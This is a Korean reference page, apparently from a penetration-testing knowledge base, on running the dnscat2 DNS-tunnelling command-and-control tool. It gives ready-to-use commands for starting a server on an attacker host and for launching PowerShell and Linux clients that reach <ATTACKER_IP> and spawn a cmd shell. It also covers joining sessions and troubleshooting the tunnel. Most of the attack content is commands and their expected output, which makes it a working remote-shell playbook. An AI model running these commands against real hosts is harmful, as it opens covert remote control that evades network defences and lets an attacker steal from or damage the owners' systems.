---
tags:
  - 서비스/dns
  - 기능/피벗
  - 기능/세션관리
실행환경: ["Linux", "Windows"]
필요권한: ["대상 호스트 코드 실행 권한"]
필요조건: ["대상에서 DNS egress 가능", "server와 client가 공유하는 secret"]
결과: ["DNS 터널", "C2 세션", "셸"]
---

# dnscat2

## 도구 개요

dnscat2는 DNS 질의와 응답을 이용해 명령·제어 통신을 전달하고 대화형 `window`와 셸을 제공하는 터널링 도구다. 일반 TCP 연결 대신 DNS 외부 통신 경로를 통해 대상과 제어 채널을 만들 때 적합하다.

## 필요한 입력과 실행 환경

- 실행 위치: 공격 호스트의 dnscat2 server와 대상 호스트의 client
- 필요한 입력: 양쪽이 공유할 secret, 사용할 도메인 또는 직접 질의할 DNS server 주소
- 전제: 대상에서 DNS egress가 허용되고 client를 실행할 코드 실행 권한이 있어야 한다.
- `<DOMAIN>`은 DNS query를 위임하거나 관찰하는 domain, `<DNS_SERVER>`는 client가 직접 질의할 server 주소이며 `<SECRET>`은 양쪽에 같은 값으로 제공한다. server 창·window ID는 시작 출력에서 얻고 shell 획득과 혼동하지 않는다.


## 표준 사용법

```bash
sudo ruby dnscat2.rb --dns host=<ATTACKER_IP>,port=53,domain=<DOMAIN> --no-cache
```

대상에서는 native client 또는 PowerShell client를 실행하고, server가 출력한 secret을 맞춘다. PowerShell client를 사용할 때는 해당 저장소가 archived 상태이며 server에 `--no-cache`가 필요하다는 버전 조건을 적용한다.

## 대표 예시

`<ATTACKER_IP>`는 client가 DNS 질의할 server 주소(예: `192.0.2.10`), `<DOMAIN>`은 위임 또는 관찰할 DNS suffix(예: `tunnel.example.test`)다. `<SECRET>`은 server 시작 출력에서 얻어 양쪽에 같은 형식으로 전달하며, window ID는 server의 `New window created` 출력에서 재사용한다.

### server 시작

```bash
sudo ruby dnscat2.rb --dns host=<ATTACKER_IP>,port=53,domain=<DOMAIN> --no-cache
```

확인할 출력:

- `New window created`
- client용 `--secret` 값.

### PowerShell client

`dnscat2-powershell`은 2023년 8월부터 archived 상태다. 이 구현은 server cache와 호환되지 않으므로 server를 `--no-cache`로 시작한다.

```powershell
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver <ATTACKER_IP> -Domain <DOMAIN> -PreSharedSecret <SECRET> -Exec cmd
```

확인할 출력:

- server prompt에 새 session/window.

### Linux native client

```bash
./dnscat2 <DOMAIN> --secret=<SECRET>
./dnscat2 --dns server=<ATTACKER_IP>,port=53 --secret=<SECRET>
```

- 첫 명령은 권한 있는 DNS domain 경로, 두 번째 명령은 server 직접 질의 방식이다.
- `New window created: <COMMAND_WINDOW_ID>`는 command session 연결을 뜻한다. native client에서 shell이 필요하면 해당 window에서 `shell`을 실행하고 새 `<SHELL_WINDOW_ID>`로 진입한다.

### window 진입

```text
dnscat2> ?
dnscat2> window -i <COMMAND_WINDOW_ID>
command session (...) <COMMAND_WINDOW_ID>> shell
dnscat2> windows
dnscat2> window -i <SHELL_WINDOW_ID>
```

확인할 출력:

- 대상 명령 세션과 상호작용 가능.

## 주요 옵션과 명령

| 명령/옵션 | 의미 | 자주 쓰는 상황 |
|---|---|---|
| `--dns host=<IP>,port=53,domain=<DOMAIN>` | DNS listener 설정 | server 시작 |
| `--no-cache` | DNS cache 영향 감소 | 테스트 중 응답 확인 |
| `-PreSharedSecret` | client/server secret 지정 | 인증/암호화 |
| `--secret=<SECRET>` | native client와 server의 사전 공유 secret | peer 인증 |
| `-Exec cmd` | cmd 실행 세션 요청 | Windows 셸 확보 |
| `window -i <ID>` | dnscat2 window 진입 | 세션 상호작용 |

## 도구 고유 출력

| 출력/상태 | 의미 | 다음 행동 |
|---|---|---|
| client용 `New window created` | command session 생성 | ID를 기록하고 `window -i <COMMAND_WINDOW_ID>`; native client는 필요하면 `shell` 생성 |
| secret 출력 | client 인증 준비 | client 옵션에 적용 |
| DNS 질의 없음 | egress/DNS 설정 문제 | `nslookup`, firewall, domain 확인 |
| secret 불일치 | PreSharedSecret 오류 | server가 출력한 secret을 client에 다시 지정 |
| 세션은 있으나 명령 실패 | client 실행 옵션 문제 | `-Exec`, 권한, PowerShell 차단 확인 |

## 관련 공격기법

- [[dnscat2 DNS 터널링]]

## 참고 링크

- [dnscat2 공식 README](https://github.com/iagox86/dnscat2/blob/master/README.md)
- [dnscat2-powershell 공식 저장소](https://github.com/lukebaggett/dnscat2-powershell)
